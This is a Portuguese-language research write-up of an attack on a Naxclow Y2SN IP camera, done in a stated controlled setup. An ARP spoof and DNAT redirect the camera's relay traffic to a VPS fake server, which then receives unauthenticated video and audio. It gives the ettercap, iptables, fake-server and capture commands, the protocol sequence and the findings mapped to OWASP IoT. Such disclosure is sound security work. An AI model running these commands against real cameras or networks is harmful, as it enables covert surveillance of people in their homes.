# Achados — Relay falso em IP público (fake server na VPS)

Cenário: câmera em uso normal (modo **STA**). O atacante **redireciona o relay de
dados** da câmera (portas `29939`–`29942`) para um servidor próprio em **IP público**
(VPS), via ARP spoof + DNAT na LAN (ou controle de DNS/rota). A câmera acredita que
fala com o relay do cloud Naxclow — na verdade fala com o atacante, que **recebe o
vídeo e o áudio** sem autenticação.

Firmware `202601081657`, câmera Naxclow Y2SN (`devicesCode 5c001502B330`).
Ambiente controlado — câmera e servidor próprios.

## Diferença dos outros vetores

| Vetor | Posição do atacante | O que prova |
|---|---|---|
| AP ([achados_ap](achados_ap.md)) | alcance WiFi, câmera em modo config | stream local (TCP 6123) |
| MITM STA ([achados_sta](achados_sta.md)) | mesma LAN (ARP spoof) | stream em STA (UDP) + control channel |
| Fake server DNS ([achados_fakeserver](achados_fakeserver.md)) | controla DNS/rota | registro P2P + controle MQTT |
| **Relay público (este)** | **redireciona o relay pra VPS própria** | **registro + stream (vídeo/áudio) no servidor do atacante** |

Aqui o atacante **é o relay**. A câmera conecta nele por conta própria e entrega a
mídia — **sem app, sem credencial, sem estar na mesma rede do alvo** (basta controlar
a rota/DNS do relay).

## Por que precisa de IP público

O cloud real entrega um **relay em IP público** (`107.149.143.96`, `107.149.136.10`, …).
A câmera **só abre o canal de dados** (TCP/UDP) para um endpoint **público**. Um fake em
IP local (AP isolado, `10.42.0.1`) **não** é aceito: a câmera registra via MQTT mas
**nunca abre o canal `:29940`**. Por isso o fake precisa rodar numa **VPS com IP
público** (`137.131.132.251` neste teste) — é o que destrava em relação ao
[achado do fake server por DNS](achados_fakeserver.md).

## Setup

Topologia: `câmera → (ARP spoof) Kali → (DNAT) VPS:29940`.

**1) VPS — fake server** (HTTP `:8080` + relay TCP/UDP `:29940`):

```bash
sudo FAKE_SRV_HOST=137.131.132.251 FAKE_SRV_RELAY_HOST=137.131.132.251 \
  .venv/bin/python src/a9_naxclow.py -s -v --proxy-port 8080
```

> **Sem** os overrides `FAKE_SRV_CLI*` / `FAKE_SRV_NAT*`. Os **defaults do código já são
> os valores do capture real** (`cliIp 191.187.210.110`, `cliPort 47006`,
> `cliNatIp 192.168.0.21`, `cliNatPort 53929`). Sobrescrever com valor errado faz a
> câmera **rejeitar o NAT probe** (`code 11` sem `code 12` → canal não abre).

**2) Kali (mesma LAN) — ARP spoof + DNAT do relay pra VPS:**

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo ettercap -Tq -i wlan0 -M arp:remote /192.168.0.17// /192.168.0.1//

# a porta do relay varia por sessao (29939-29942): cobre todas, TCP e UDP
for p in 29939 29940 29941 29942; do
  sudo iptables -t nat -A PREROUTING -p tcp -s 192.168.0.17 --dport $p -j DNAT --to 137.131.132.251:29940
  sudo iptables -t nat -A PREROUTING -p udp -s 192.168.0.17 --dport $p -j DNAT --to 137.131.132.251:29940
done
```

O `mitm_dns.sh` já faz isso (relay-only):

```bash
sudo DNAT_TARGET=137.131.132.251 ./scripts/mitm_dns/mitm_dns.sh relay
```

**3) Gatilho:** abrir o viewer no app com o celular em **4G/3G**. Na mesma WiFi a câmera
conecta em P2P local e **não** passa pelo relay. Em rede móvel o cloud publica o `240`
com o relay e a câmera conecta — o DNAT manda pra VPS.

## Achado-chave: a porta do relay varia (29939–29942)

O comando `240` (MQTT) traz o campo `tcpPort`. No capture o valor foi **`29939`** (não
`29940`). O fake escuta `29940` por default — então **DNAT só em 29940 não pega** a
conexão (o SYN-ACK volta do relay real, MSS do cloud). Cobrir **`29939`–`29942`** em TCP
e UDP resolve.

## Sequência (o que a câmera faz sozinha, contra o fake)

```
1. MQTT 240           cloud manda o relay     -> câmera conecta em host:29939
2. TCP   conexão       câmera -> fake:29940 (via DNAT)
3. TCP   code 100      registro                -> fake responde code 101
4. TCP   code 11       NAT probe               -> câmera responde code 12
5. UDP   code 20/21, 50/51                      -> abre o data-channel
6. TCP   code 53 / 298 / 4 / 3                  -> status, retransmissão, baseinfo, open A+V
7. UDP   stream: cmd 1 (JPEG) + cmd 6 (PCM)     -> vídeo + áudio no relay do atacante
```

## Prova — stream no relay do atacante

Com a câmera registrada no fake, o fake anuncia a câmera e serve o stream:

```
http://<VPS>:8080/dev/list            -> [{"host":"...","port":...,"uid":"5c001502B330"}]
http://<VPS>:8080/dev/<uid>/live      -> MJPG
http://<VPS>:8080/dev/<uid>/audio     -> PCM / G711
http://<VPS>:8080/dev/<uid>/snapshot  -> frame JPEG
http://<VPS>:8080/dev/<uid>/hls       -> player HLS (ffmpeg JPEG -> H.264)
http://<VPS>:8080/dev/<uid>/fwd?v=<code>  -> envia um 301 com content.code=<code> (teste de comando)
```

Captura e remontagem (tcpdump da `:29940` na VPS + extractor):

```bash
sudo tcpdump -i any -n -w /tmp/vps_stream.pcap port 29940
python3 scripts/utils/extract_mitm_video_udp.py /tmp/vps_stream.pcap \
  --out /tmp/extract --cam-ip 191.187.210.110
```

`--cam-ip` = IP **público** da câmera (o source visto pela VPS). Protocolo do stream:
header de 20 bytes; `cmd 1 = JPEG` (HEAD/BODY/END), `cmd 6 = PCM`, `cmd 4 = G711`,
`cmd 0 = JSON`, `cmd 100 = heartbeat` — idêntico ao STA, ver
[achados_sta](achados_sta.md).

## Vulnerabilidades (OWASP IoT)

| Achado | Evidência | OWASP |
|---|---|---|
| Relay sem autenticação | câmera aceita relay em IP público arbitrário | **I2 / I7** |
| Sem validação de servidor | conecta no relay do atacante só por rota/DNS | **I2** |
| Stream de mídia em claro | vídeo (JPEG) + áudio (PCM/G711) no UDP, sem TLS | **I5** |
| Espionagem remota | vídeo/áudio recebidos no servidor do atacante, sem app | **I3 / I5** |
| Registro P2P sem credencial | `code 100` aceito sem token | **I1 / I3** |

## Quão fácil / problemas

- **É o vetor mais "infra" de todos:** exige uma **VPS com IP público** + redirecionar o
  relay (ARP spoof/DNAT na LAN **ou** controle de DNS/rota). Em impactos, é o mais
  grave: o atacante recebe o stream **remotamente**, sem app e sem estar na LAN do alvo.
- **Em IP local não funciona:** a câmera só abre o canal pra endpoint **público** (relay).
  Foi o que travava o [fake server por DNS](achados_fakeserver.md).
- **Porta do relay muda** (`29939`–`29942`): o DNAT tem que cobrir a faixa, em TCP e UDP.
- **NAT probe é validado:** `cliIp` / `cliPort` / `cliNatIp` / `cliNatPort` têm que bater
  com a sessão da câmera (os defaults do `v720_sta.py` são os valores reais).
- **Firmware cicla o TCP** (~12–47 s): o device re-registra sozinho; o fake mantém o
  device no `/dev/list` e o UDP de dados vivo entre os ciclos (fix em `v720_sta.py`:
  `_on_disconnect` não remove mais o device; `__tcp_hnd` não fecha mais o UDP).

## Ferramentas

- `src/a9_naxclow.py -s` — fake server (HTTP + relay).
- `scripts/mitm_dns/mitm_dns.sh` — ARP spoof + DNAT (`relay`, `DNAT_TARGET`).
- `scripts/utils/extract_mitm_video_udp.py` — remontagem do stream UDP.
- `src/v720_hls.py` — JPEG -> HLS/H.264 via ffmpeg.
